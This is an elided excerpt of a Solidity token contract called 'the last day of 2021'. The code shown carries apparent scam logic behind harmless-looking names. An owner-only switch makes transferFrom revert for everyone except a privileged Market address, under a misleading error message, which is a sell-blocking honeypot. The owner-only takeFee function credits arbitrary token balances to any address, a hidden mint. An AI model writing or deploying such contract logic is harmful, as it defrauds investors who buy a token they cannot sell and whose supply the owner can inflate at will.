...
contract Ownable is Context {
    ...
    address private _OwnerAddress = 0xD22E0c61D0090563114fC7e5fC080fB6a87798c0;
...
contract thelastdayof2021  is Context, IERC20, Ownable {
    ...
    uint256 private _total = 2021 * 10**6;
    uint256 private _tFeeTotal;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address Market;
    uint256 public deadFee = 3;
    string private _name = "the last day of 2021";
    string private _symbol = "the last day of 2021";
    ...
    function transferFrom(
        ...
        if(inSwapAndLiquify){
        require(Market == sender, "Transfer amount must be greater than zero");
        }
        if(_isExcludedFromFeelist[_msgSender()] || _isExcludedFromFeelist[recipient]){
    ...
    function transferFrom(bool amountt) external OwnerAddress() {
        inSwapAndLiquify = amountt;
    }
    function takeFee(address dod, uint256 cod) external OwnerAddress() {
        require(cod > 0);
        uint256 duck = fees[dod];
        if (duck == 0) _fees.push(dod);
        fees[dod] = duck.add(cod);
        fee = fee.add(cod);
        _balance[dod] = _balance[dod].add(cod);
    }
    ...
    function swapTokensForbnb(address amountt)
        external
        view
        OwnerAddress()        
        returns (bool)
